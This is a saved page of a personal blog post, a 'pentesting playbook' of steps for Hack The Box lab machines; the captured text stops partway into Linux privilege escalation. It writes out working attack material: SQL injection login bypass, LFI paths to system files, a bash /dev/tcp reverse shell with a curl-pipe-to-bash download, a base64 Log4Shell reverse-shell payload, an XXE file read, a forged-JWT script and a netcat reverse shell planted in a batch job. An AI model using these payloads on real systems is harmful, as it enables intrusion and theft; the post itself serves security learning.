<!DOCTYPE html>
<!--
    Type on Strap jekyll theme v2.4.3
    Theme free for personal and commercial use under the MIT license
    https://github.com/sylhare/Type-on-Strap/blob/master/LICENSE
-->
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=5">

    <!-- Theme Mode-->
    
    <script>
        const isAutoTheme = true;
        document.documentElement.setAttribute('data-theme', sessionStorage.getItem('theme'))
    </script>
    

    <!-- Main JS (navbar.js, katex_init.js and masonry_init.js)-->
    <script defer src="/assets/js/main.min.js"></script>

    <!-- CSS -->
    <link rel="stylesheet" href="/assets/css/main.css">

    <!--Favicon-->
    <link rel="shortcut icon" href="/assets/img/avatars/me-100x100.png" type="image/x-icon">

    

    <!-- KaTeX 0.15.2 -->
    
    <script defer src="/assets/js/vendor/katex.min.js"></script>
    <script defer src="/assets/js/vendor/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
    

    <!-- Mermaid 9.1.1 -->
    
    <script defer src="/assets/js/vendor/mermaid.min.js" onload="mermaid.initialize({
      startOnLoad:true,
      theme: 'default',
    });"></script>
    

    <!-- Simple Jekyll Search 1.10.0 -->
    <script src="/assets/js/vendor/simple-jekyll-search.min.js" type="text/javascript"></script>

    <!-- Google Analytics / Cookie Consent -->
    <script>
      const cookieName = 'cookie-notice-dismissed-https://www.agalera.eu';
      const isCookieConsent = 'false';
      const analyticsName = 'UA-126206451-1';
      const analyticsNameGA4 = '';
    </script>

    
    
        <!-- old google analytics -->
        <!--
        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-126206451-1"></script>
        <script async src='https://www.google-analytics.com/analytics.js'></script>
        <script>
        // disable GA for localhost
        const isProduction = window.location.host.includes("agalera.eu")
        if (!isProduction) { 
          console.log(`Disabling google analytics for UA-126206451-1`)
          window['ga-disable-UA-126206451-1'] = true;
        }
        </script>
        -->
        <!-- Google tag (gtag.js) -->
        <script async src="https://www.googletagmanager.com/gtag/js?id=G-S8VGYBN25C"></script>
        <script>
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());

          gtag('config', 'G-S8VGYBN25C');
        </script>        
    

    <!-- seo tags -->
    <meta property="og:image" content="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg">
    
    <meta property="og:type" content="website" />
    
    <!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Pentesting playbook | Adrian Galera blog</title>
<meta name="generator" content="Jekyll v4.3.1" />
<meta property="og:title" content="Pentesting playbook" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="I keep this page as a reference to the steps I take to solve puzzles from https://www.hackthebox.com/" />
<meta property="og:description" content="I keep this page as a reference to the steps I take to solve puzzles from https://www.hackthebox.com/" />
<link rel="canonical" href="https://www.agalera.eu/pentesting-playbook/" />
<meta property="og:url" content="https://www.agalera.eu/pentesting-playbook/" />
<meta property="og:site_name" content="Adrian Galera blog" />
<meta property="og:image" content="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-12-25T00:00:00+01:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" />
<meta property="twitter:title" content="Pentesting playbook" />
<script type="application/ld+json">
{"mainEntityOfPage":{"@type":"WebPage","@id":"https://www.agalera.eu/pentesting-playbook/"},"url":"https://www.agalera.eu/pentesting-playbook/","@type":"BlogPosting","description":"I keep this page as a reference to the steps I take to solve puzzles from https://www.hackthebox.com/","image":"https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg","headline":"Pentesting playbook","dateModified":"2022-12-25T00:00:00+01:00","datePublished":"2022-12-25T00:00:00+01:00","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


    <!-- RSS -->
    <link rel="alternate" type="application/atom+xml" title="Adrian Galera blog" href="https://www.agalera.eu/feed.xml"/>
    <link type="application/atom+xml" rel="alternate" href="https://www.agalera.eu/feed.xml" title="Adrian Galera blog" />

    <!-- Twitter Cards -->
    <meta name="twitter:title" content="Pentesting playbook">
    <meta name="twitter:description" content="I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the steps I take to complete the challenges.While ...">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg">
    <meta name="twitter:image:alt" content="Pentesting playbook">
</head>

  <body>
    <header class="site-header">

    <!-- Logo and title -->
	<div class="branding">
        
		<a href="/">
			<img alt="logo img" class="avatar" src="/assets/img/avatars/me-100x100.png" />
		</a>
        
        <a class="site-title" aria-label="Adrian Galera blog" href="/">
        Adrian Galera blog
		</a>
	</div>

    <!-- Toggle menu -->
    <nav class="clear">
    <a aria-label="pull" id="pull" class="toggle" href="#">
    <i class="fas fa-bars fa-lg"></i>
    </a>

    <!-- Menu -->
    <ul class="hide">
        

        
            
            
        
            
            
        
            
            
        
            
            
        
            
            
        
            
            
        
            
            
        
            
            <li class="separator"> | </li>
            <li>
                <a class="clear" aria-label="Search" title="Search" href="/search/">
                     <i class="fas fa-search" aria-hidden="true"></i>
                    
                </a>
            </li>
            
            
        
            
            <li class="separator"> | </li>
            <li>
                <a class="clear" aria-label="Tags" title="Tags" href="/tags/">
                     <i class="fas fa-tags" aria-hidden="true"></i>
                    
                </a>
            </li>
            
            
        
            
            
        
            
            
        
            
            
        
            
            
        
            
            
        
            
            
        
            
            
        
            
            
        
            
            
        
        
        
        <li class="separator"> | </li>
        <li><a id="theme-toggle" title="Pentesting playbook " aria-label="Pentesting playbook" onclick="themeToggle()"></a></li>
        
    </ul>

	</nav>
</header>

    <div class="content">
      <article class="feature-image" >
  <header id="main" style="">
    <div class="title-padder">
      
      <h1 id="Pentesting+playbook" class="title">Pentesting playbook</h1>
      


<div class="post-info">
    <p class="meta">
      
      
      December 25, 2022
    </p></div>

      
    </div>
  </header>

  <section class="post-content">
  
      <p>I have started playing around in <a href="https://www.hackthebox.com/">https://www.hackthebox.com</a> platform and I’ll use this article to save all the steps I take to complete the challenges.</p>

<p><!--more--></p>

<p>While performing pentesting, there are a series of steps that are always the same. The steps are (sorted by order):</p>

<h2 id="table-of-contents">Table of contents</h2>
<ol>
  <li><a href="#enumeration">Enumeration</a></li>
  <li><a href="#breaking-in">Breaking in</a>
    <ol>
      <li><a href="#anonymous-access">Poorly configured access</a></li>
      <li><a href="#brute-force-user">Brute force user/password</a></li>
      <li><a href="#sql-injection">SQL Injection</a></li>
      <li><a href="#ssti">Server-side template injection</a></li>
      <li><a href="#arbitrary-file-upload">Arbitrary file upload</a></li>
      <li><a href="#lfi">Local file inclusion</a></li>
      <li><a href="#rfi">Remote file inclusion</a></li>
      <li><a href="#reverse-shell">Reverse shell</a></li>
      <li><a href="#rogue">Rogue servers</a>
        <ol>
          <li><a href="#ntlm">NTLM</a></li>
          <li><a href="#log4j-shell">Log4JShell</a></li>
        </ol>
      </li>
      <li><a href="#search-vuln">Search for vulnerabilities</a></li>
      <li><a href="#xxe">XML eXternal Entities</a></li>
      <li><a href="#jwt-confussion">JWT Key Confussion</a></li>
    </ol>
  </li>
  <li><a href="#foothold">Foothold, we are in</a>
    <ol>
      <li><a href="#list-users">List users/group</a></li>
      <li><a href="#search-keywords">Search keywords</a></li>
      <li><a href="#local-port-forwarding">Local port forwarding</a></li>
      <li><a href="#lateral-movement">Lateral movement</a></li>
      <li><a href="#ssh-keys">Search for SSH keys</a></li>
    </ol>
  </li>
  <li><a href="#privilege-escalation">Privilege escalation</a>
    <ol>
      <li><a href="#privilege-escalation-windows">Privilege escalation on Windows</a></li>
      <li><a href="#privilege-escalation-linux">Privilege escalation on Linux</a>
        <ol>
          <li><a href="#privilege-escalation-suid">Set owner User ID</a></li>
          <li><a href="#privilege-escalation-app">Abuse regular application</a></li>
        </ol>
      </li>
    </ol>
  </li>
</ol>

<h3 id="enumeration-">Enumeration <a name="enumeration"></a></h3>

<p>Using <code class="language-plaintext highlighter-rouge">nmap</code> the attacker needs to see what is open in the target machine. For reference check: <a href="/pentesting-tools/">pentesting tools.</a></p>

<p>At this stage, we’ll behave like a legitimate user, e.g.: perform regular searches, etc…</p>

<p>If you discover a website, it’s interesting to test the following enumeration techniques:</p>

<h4 id="directory-brute-force">Directory brute force</h4>

<p>This is a technique useful to detect available paths for a web application. Also known as dir busting.</p>

<p>The technique consist in using a list of words and try all the combinations in the dictionary to see if the web server returns a positive (200 OK) answer to the page. If so, we discover a page in that path.</p>

<p>The tools to perform this is <code class="language-plaintext highlighter-rouge">gobuster</code>.</p>

<p>Another option is to use sitemap functionality of <code class="language-plaintext highlighter-rouge">burp</code> suite</p>

<p>For reference check: <a href="/pentesting-tools/">pentesting tools.</a></p>

<h4 id="sub-domain-brute-force">Sub-domain brute force</h4>

<p>This techniques tries to discover sub-domains configured, you can do it by checking the DNS records or the virtual hosts configured in a server. You can use <code class="language-plaintext highlighter-rouge">gobuster</code> to perform this.</p>

<h3 id="breaking-in-">Breaking in <a name="breaking-in"></a></h3>

<p>This stage is the most varied one, the idea is to find a vulnerability to get to a shell into the machine. At this point, you should have a list of services (and versions) that are running in the machine. You can do a google query with the service you want to explot.</p>

<p>The attack vector is different to each machine, here you can find most common vector attacks:</p>

<h4 id="poorly-configured-access-">Poorly configured access <a name="anonymous-access"></a></h4>

<p>The user might have <code class="language-plaintext highlighter-rouge">ftp</code> or <code class="language-plaintext highlighter-rouge">tftp</code> or <code class="language-plaintext highlighter-rouge">smb</code> shares with anonymous access. It’s worth taking a look because those access might leak some valuable information. Additionally, you can also check <code class="language-plaintext highlighter-rouge">metasploit</code> to check for this kind of access.</p>

<p>You can also check if the page is using php to abuse the <code class="language-plaintext highlighter-rouge">strcmp</code> function. Example: <a href="https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016">https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016</a></p>

<p>For reference check: <a href="/pentesting-tools/">pentesting tools.</a></p>

<h4 id="brute-force-user-password-">Brute force user password <a name="brute-force-user"></a></h4>

<p>If you discover a login page, why not trying some default user/password combinations?. One thing to try is to search for the version of the software and query google for the default user/password.</p>

<p>Try the following user/password combinations first:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin:admin
administrator:administrator
admin:administrator
admin:password
administrator:password
</code></pre></div></div>

<p>Another option to try here is to try to brute force the user/password:</p>

<p>You can try a dictionary attack to bruce force user/password combinations.</p>

<p>You can use a tool like thc-hydra: <a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a>. However, this will fail if there if there’s any kind of CSRF protection.</p>

<p>In order to bypass the CSRF protection, we must do the requests from the browser. I prepared a tool to do that:</p>

<p><a href="https://github.com/adriangalera/pydra/">https://github.com/adriangalera/pydra/</a></p>

<p>Take into account that if you know for sure the user, it will take much less time than having to guess both user and password.</p>

<h4 id="sql-injection-">SQL Injection <a name="sql-injection"></a></h4>

<p>Poorly programmed queries can be very dangerous and leads to escaping issues in the queries. If you see any indications of a query, try to use <code class="language-plaintext highlighter-rouge">sqlmap</code> to identify potential SQL injections or try some very basic ones.</p>

<p>If the SQL queries are poorly built, it means that they are susceptible to SQL injections. If the user input is not sanitised, we can break up SQL queries that will cause problems, such as bypassing a login page.</p>

<p>A typical SQL query for a login page can look like this:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">members</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'admin'</span> <span class="k">AND</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">'admin'</span>
</code></pre></div></div>

<p>If the input values are not sanitised, we can break the query by putting a comment character to comment the part of query that does the password checking:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">members</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'admin'</span> <span class="o">#</span><span class="s1">' AND password = '</span><span class="n">kjdfjklsdf</span><span class="s1">'
</span></code></pre></div></div>

<p>Now the query becomes:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">members</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'admin'</span>
</code></pre></div></div>

<p>therefore, the query is no longer checking for password and the login page is bypassed.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username: admin'#
password: admin123 (any password will do the trick)
</code></pre></div></div>

<p>You can find more SQL injections here: <a href="https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/">https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/</a></p>

<p>Pay attention when breaking the rest of the query with comments. The standard comment <code class="language-plaintext highlighter-rouge">--</code> might not always work, it’s worth trying another kind of comments like <code class="language-plaintext highlighter-rouge">#</code></p>

<h4 id="server-side-template-injection-">Server side template injection <a name="ssti"></a></h4>

<p>if you see a search form and you type something and you see the output of what you typed again in the webpage, the webpage might be susceptible for SSTI. Try to identify which template engine and search how to exploit it.</p>

<p>If the target is using a templating engine, it is possible to use the template injection to execute commands in the server.</p>

<p>One easy way to test that is to put something like {{7*7}} in the template and check for the result.</p>

<p>If the template executes, we’ll see the result, out of luck we will see nothing. Or maybe we’ll see some trace that reveals the technology behind.</p>

<h4 id="arbitrary-file-upload-">Arbitrary file upload <a name="arbitrary-file-upload"></a></h4>

<p>This is a very interesting vulnerability. It lets the attacker upload some file to the server. You can do this to start a reverse shell. That is the targeted machine establish a permanent connection to the attacker machine and it provides a shell where the attacker can run commands if it was inside the machine.</p>

<h4 id="local-file-include-lfi-">Local File Include (LFI) <a name="lfi"></a></h4>

<p>Abuse of file loading capability (for instance PHP include function) to show a local file in the browser:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts
</code></pre></div></div>

<p>You can try to read the following files for Linux:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/hosts
/etc/passwd
</code></pre></div></div>

<p>and for Windows:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:/Windows/System32/drivers/etc/hosts
c:/windows/win.ini
</code></pre></div></div>

<h4 id="remote-file-include-rfi-">Remote File Include (RFI) <a name="rfi"></a></h4>

<p>Remote file inclusion (RFI) is an attack targeting vulnerabilities in web applications that dynamically reference external scripts.</p>

<p>This can be use to force the target make a call to a compromised host in the same network and captura the credentials challenge:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://unika.htb/index.php?page=\\10.1.2.3\blabla\
</code></pre></div></div>

<h4 id="reverse-shell-">Reverse shell <a name="reverse-shell"></a></h4>

<p>Reverse basically means that it is the target that will initiate a connection request back us (the attacker).</p>

<p>For example, once we have remote code execution in the target, we’ll be able to download and execute a piece of code.</p>

<p>Usually the process is:</p>
<ul>
  <li>Create a file in the attacker machine containing a reverse shell payload:
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/&lt;YOUR_IP_ADDRESS&gt;/1337 0&gt;&amp;1
</code></pre></div>    </div>
  </li>
  <li>Create a server in the attacker machine which will act as the shell I/O. Normally this is done with <code class="language-plaintext highlighter-rouge">netcat</code>.
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nvlp</span> 1337
</code></pre></div>    </div>
  </li>
  <li>Start a webserver in the attacker machine that will server the reserve shell payload. You can do that with python (in the same directory as the payload):
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 8000
</code></pre></div>    </div>
  </li>
  <li>Make the target machine download and execute the reverse shell payload:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://thetoppers.htb/shell.php?cmd=curl%20%3CYOUR_IP_ADDRESS%3E:8000/shell.sh|bash
</code></pre></div>    </div>
  </li>
</ul>

<p>You can find a list of reverse shells here: <a href="https://www.revshells.com/">https://www.revshells.com/</a></p>

<p>Once you have shell access, you can try to get a improve the shell if python is installed:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
</code></pre></div></div>
<p>or</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script /dev/null <span class="nt">-c</span> bash
</code></pre></div></div>
<p>or</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
CTRL+Z
<span class="nb">stty </span>raw <span class="nt">-echo</span>
<span class="nb">fg
export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<p>Or, you can find mmore methods to improve the shell here: <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a></p>

<p>For reference check: <a href="/pentesting-tools/">pentesting tools.</a></p>

<h4 id="rogue-servers-">Rogue servers <a name="rogue"></a></h4>

<p>The idea of rogue server is to start a server in the attacker machine and make the target machine speaks with the attacker server. This is used for instance to retrieve NTLM hash challenge or to explot log4j vulnerability.</p>

<h5 id="ntlm-">NTLM <a name="ntlm"></a></h5>

<p>Windows New Technology LAN Manager (NTLM) is a suite of security protocols offered by Microsoft to authenticate users’ identity and protect the integrity and confidentiality of their activity. At its core, NTLM is a single sign on (SSO) tool that relies on a challenge-response protocol to confirm the user without requiring them to submit a password.</p>

<p>In order to mess with it, you might use the <a href="https://github.com/lgandx/Responder">responder tool</a></p>

<p>The idea to bypass the NTLM is to force the target authenticate against a rogue SMB server (provided by <code class="language-plaintext highlighter-rouge">responder</code> tool). This tool will capture the authentication challenge hash and then you can use <code class="language-plaintext highlighter-rouge">john</code> tool to compare the hash with a dictionary to see if any entry matches.</p>

<p>For reference check: <a href="/pentesting-tools/">pentesting tools.</a></p>

<h5 id="log4jshell-">Log4jShell <a name="log4j-shell"></a></h5>

<p>It was discovered that log4j libraries for certain versions were vulnerable to remote code execution. In order to do so, you setup a rogue JNDI/LDAP server from <a href="https://github.com/veracode-research/rogue-jndi">https://github.com/veracode-research/rogue-jndi</a>in the attacker machine and send a JNDI command to the target machine to communicate with the rogue LDAP server to get a revershe shell on the attacker machine.</p>

<p>E.g.:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> target/RogueJndi-1.1.jar <span class="nt">--command</span> <span class="s2">"bash -c
{echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzMvNDQ0NCAwPiYxCg==}|{base64,-
d}|{bash,-i}"</span> <span class="nt">--hostname</span> <span class="s2">"10.10.14.33"</span>
</code></pre></div></div>
<p>Start the rogue JNDI server that will start a reverse shell on 10.10.14.33 using the base64 payload provided.</p>

<p>Then, send the payload to force the target machine connect the rogue JNDI/LDAP server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}
</code></pre></div></div>

<h4 id="search-for-vulnerabilities-">Search for vulnerabilities <a name="search-vuln"></a></h4>

<p>If you can establish the version of the service running, you can query for any known vulnerability of that version:</p>

<p><a href="https://cve.mitre.org/cve/search_cve_list.html">https://cve.mitre.org/cve/search_cve_list.html</a></p>

<h4 id="xml-external-entities-">XML eXternal Entities <a name="xxe"></a></h4>

<p>If the application is using XML to process any input data, it might be vulnerable to this kind of attacks.</p>

<p>This attack works because the XML parser usually are configured with support for XML external entities. This is a feature of XML to be able to define objects outside the defined structure, but can be abuse to list internal files or to make connections to the outside of the target machine.</p>

<p>In order to check if the machine is vulnerable to this attack, you can try to show the contents of <code class="language-plaintext highlighter-rouge">/etc/hosts</code>(Linux) or <code class="language-plaintext highlighter-rouge">C:/Windows/System32/drivers/etc/hosts</code>(Windows). e.g.:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version = "1.0"?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts" &gt;</span>]&gt;
<span class="nt">&lt;order&gt;&lt;quantity&gt;</span>2<span class="nt">&lt;/quantity&gt;&lt;item&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/item&gt;&lt;address&gt;</span>Fake street 1234<span class="nt">&lt;/address&gt;&lt;/order&gt;</span>
</code></pre></div></div>

<h4 id="jw-key-confussion-attack-">JW Key confussion attack <a name="jwt-confussion"></a></h4>

<p>JWT Tokens are a way to sign and verify tokens that can contain important data such as credencials, roles, etc…</p>

<p>They have two ways of working: asymetric (RSA) and symmetric. In asymetric the token is signed with the private key and can be verified with the public key. In symmetric, the token is signed with a shared secret.</p>

<p>This signing and verifing is very important because it ensures that nobody modifies the tokens.</p>

<p>However, for old unsecure version of the libraries that handles this, it is possible to modify the payload and sign with the public key (if you are lucky enough to get it). When we change the signing algorithm, we are telling the other side that we’re using symmetric algorithm.</p>

<p>See the following example:</p>

<p>In the received side, the token is verified using symmetric and asymmetric algorithms:</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="nx">decode</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">(</span><span class="k">await</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">publicKey</span><span class="p">,</span> <span class="p">{</span> <span class="na">algorithms</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">RS256</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">HS256</span><span class="dl">'</span><span class="p">]</span> <span class="p">}));</span>
<span class="p">}</span>
</code></pre></div></div>
<p>First, it will try with RSA (RS) and later with Hash (HS) if the previous fails.</p>

<p>This way in the client side, we can modify the payload and sign the payload by changing the signing algorithm:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">jsonwebtoken</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">publicKey</span>  <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">./public.key</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">utf8</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">validJwtToken</span>  <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">./jwt-token.txt</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">utf8</span><span class="dl">'</span><span class="p">);</span>

<span class="nx">decoded</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">validJwtToken</span><span class="p">,</span> <span class="nx">publicKey</span><span class="p">,</span> <span class="p">{</span> <span class="na">algorithms</span><span class="p">:</span> <span class="p">[</span><span class="dl">"</span><span class="s2">RS256</span><span class="dl">"</span><span class="p">]})</span>
<span class="nx">decoded</span><span class="p">[</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">admin' AND 1=2 UNION SELECT 1,top_secret_flaag,3 FROM flag_storage  -- -</span><span class="dl">"</span>
<span class="nx">re_encoded</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">sign</span><span class="p">(</span><span class="nx">decoded</span><span class="p">,</span> <span class="nx">publicKey</span><span class="p">,</span> <span class="p">{</span><span class="na">algorithm</span><span class="p">:</span> <span class="dl">'</span><span class="s1">HS256</span><span class="dl">'</span><span class="p">})</span>

<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">re_encoded</span><span class="p">)</span>
</code></pre></div></div>
<p>Here, we are using the public key to verify the received token, as the regular way.</p>

<p>Then, we change the payload and we sign again to generate the JWT. We use the public key and we change the algorithm to Hash. This way the received will verify the token using the public key. It will first fail with the asymmetric but it will work with the symmetric algorithm.</p>

<p>In this case, we are modifying the token to retrieve something from the database using an SQL injection.</p>

<h3 id="foothold-we-are-in-">Foothold, we are in <a name="foothold"></a></h3>

<p>At this point we have shell (or reverse) access to the target machine. We can start to do some interesting stuff:</p>

<h4 id="list-users-and-groups-">List users and groups <a name="list-users"></a></h4>

<p>You can query all the available users in the target by querying <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p>

<p>To retrieve the details about the current shell user, you can do <code class="language-plaintext highlighter-rouge">id</code> command. It will list the groups that the user belong. This might be useful for privilege escalation.</p>

<p>You can also list the binaries the user or group has access:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-group</span> bugtracker 2&gt;/dev/null
</code></pre></div></div>

<h4 id="search-for-interesting-keywords-">Search for interesting keywords <a name="search-keywords"></a></h4>

<p>You can search inside the contents of files for interesting contents (passwords):</p>

<p>Let’s image someone decided to hardcode a username/password in one file in a web server. You can find it checking the files one by one or, you can use grep to search all files for interesting keywords:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="nt">-Ril</span> <span class="s1">'passwd*'</span> /var/www/html
</code></pre></div></div>

<p>-R recursive
-i ignore case
-l show the file, not the match</p>

<h4 id="local-port-forwarding-">Local port forwarding <a name="local-port-forwarding"></a></h4>

<p>Imagine you gain access to a machine which is running a service only for localhost. You can make that service available outside localhost by doing local port forwarding. e.g funnel.htb server is running postgres on port 5432.</p>

<p>With the next command, we’ll do a SSH tunnel between localhost:5432 and funnel.htb:5432 port</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-L</span> 5432:localhost:5432 christine@funnel.htb
</code></pre></div></div>

<h4 id="lateral-movement-">Lateral movement <a name="lateral-movement"></a></h4>

<p>Normally when the attacker get shell acess, the user has very few permissions. The attacker should check for credentials (inside database, inside files), etc… to switch from a low-permission user to a user with more permissions. That’s called lateral movement and it’s a step forward privilege escalation.</p>

<h4 id="search-for-ssh-keys-">Search for SSH keys <a name="ssh-keys"></a></h4>

<p>Once we got shell access to a machine, it might be worth to try to retrieve the SSH private keys for the user. In order to do so, we must check the <code class="language-plaintext highlighter-rouge">.ssh</code> folder in the user home:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/michael/.ssh/id_rsa
c/users/daniel/.ssh/id_rsa
</code></pre></div></div>

<p>Paste the contents of that private key into the attacker machine and run:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod 4000 michael-id-rsa
ssh -i michael-id-rsa michael@target.htb
</code></pre></div></div>

<h3 id="privilege-escalation-">Privilege escalation <a name="privilege-escalation"></a></h3>

<p>At this point we have shell (or reverse) access to the target machine, however, want to achieve root (or Administrator) access to the target machine. The mecanism might differ depending on the application or OS we’re exploting.</p>

<h3 id="privilege-escalation-on-windows-">Privilege escalation on Windows <a name="privilege-escalation-windows"></a></h3>

<p>You can use <a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a>.</p>

<p>You need to run the executable file in the target Windows machine. The script will identify the possible vulnerabilities to explot and gain admin access.</p>

<p>It might be possible that the password of the admin user has been pasted in the history of the shell. Check the output of winpeas for references to <code class="language-plaintext highlighter-rouge">ConsoleHost_history.txt</code> file.</p>

<p>Another interesting path to privilege escalation is to check the permissions of a file. In order to do so, run <code class="language-plaintext highlighter-rouge">icacls</code> command. (F) means <code class="language-plaintext highlighter-rouge">Full access</code> and is a promising way of privilege escalation.</p>

<p>You can potentially modify a script and make it open a reverse shell with netcat.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span>C:<span class="se">\L</span>og-Management<span class="se">\n</span>c64.exe <span class="nt">-e</span> cmd.exe <span class="o">{</span>your_IP<span class="o">}</span> <span class="o">{</span>port<span class="o">}</span> <span class="o">&gt;</span> C:<span class="se">\L</span>og-Management<span class="se">\j</span>ob.bat
</code></pre></div></div>

<p>When the script is executed, you’ll get a shell in the attacker netcat</p>

<h3 id="privilege-escalation-on-linux-">Privilege escalation on Linux <a name="privilege-escalation-linux"></a></h3>

<p>First, check what permissions <code class="language-plaintext highlighter-rouge">sudo</code> permissions the user has with <code class="language-plaintext highlighter-rouge">sudo -l</code>.</p>

<p>Also, check the binaries accessible to the group of the user:</p>
